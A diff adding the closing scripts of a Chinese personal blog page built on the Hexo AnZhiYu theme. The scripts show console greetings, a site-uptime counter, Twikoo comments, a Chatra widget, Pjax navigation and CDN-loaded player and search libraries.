+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Takake 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
+  var grt = new Date("12/01/2023 00:00:00"); //设置网站上线时间
+  var now = new Date();
+  var dnum;
+  var hnum;
+  var mnum;
+  var snum;
+  var nowHour;
+
+  // 计算并更新天数、小时数、分钟数和秒数
+  function updateTime() {
+    now = new Date(); // 更新 now 的值
+    nowHour = now.getHours(); // 更新 nowHour 的值
+    var days = (now - grt) / 1000 / 60 / 60 / 24;
+    dnum = Math.floor(days);
+    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+      hnum = "0" + hnum;
+    }
+    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+      mnum = "0" + mnum;
+    }
+    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+      snum = "0" + snum;
+    }
+  }
+
+  // 更新网页中显示的网站运行时间
+  function updateHtml() {
+    const footer = document.getElementById("footer");
+    if (!footer) return
+    let currentTimeHtml = "";
+    if (nowHour < 18 && nowHour >= 9) {
+      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    } else {
+      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
+      let img = document.querySelector("#workboard .workSituationImg");
+      if (img != null) {
+        img.src = "https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064228.png";
+        img.title = "下班玩人工智能，嘿嘿~";
+        img.alt = "下班玩人工智能，嘿嘿~";
+      }
+
+      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
+    }
+
+    if (document.getElementById("runtimeTextTip")) {
+      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
+    }
+  }
+
+  setInterval(() => {
+    updateTime();
+    updateHtml();
+  }, 1000);
+})();</script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
+      region: '',
+      onCommentLoaded: () => {
+        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(runFn,0)
+    else getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const runFn = () => {
+    init();
+    
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    const runTwikoo = () => {
+      twikoo.getRecentComments({
+        envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
+        region: '',
+        pageSize: 6,
+        includeReply: true
+      }).then(function (res) {
+        const twikooArray = res.map(e => {
+          return {
+            'content': changeContent(e.comment),
+            'avatar': e.avatar,
+            'nick': e.nick,
+            'url': e.url + '#' + e.id,
+            'date': new Date(e.created).toISOString()
+          }
+        })
+
+        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
+        generateHtml(twikooArray)
+      }).catch(function (err) {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+    }
+
+    if (typeof twikoo === 'object') {
+      runTwikoo()
+    } else {
+      getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
+    }
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('twikoo-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "vister@takake.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script>(() => {
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    const close = () => {
+      Chatra('minimizeWidget')
+      Chatra('hide')
+    }
+
+    const open = () => {
+      Chatra('openChat', true)
+      Chatra('show')
+    }
+
+    window.ChatraSetup = {
+      startHidden: true
+    }
+  
+    window.chatBtnFn = () => {
+      const isShow = document.getElementById('chatra').classList.contains('chatra--expanded')
+      isShow ? close() : open()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => {
+        Chatra('hide')
+      },
+      show: () => {
+        Chatra('show')
+      }
+    }
+  }
+
+  (function(d, w, c) {
+    w.ChatraID = 'MYtmap9meYHQGdDTJ'
+    var s = d.createElement('script')
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments)
+    }
+    s.async = true
+    s.src = 'https://call.chatra.io/chatra.js'
+    if (d.head) d.head.appendChild(s)
+  })(document, window, 'Chatra')
+
+})()</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
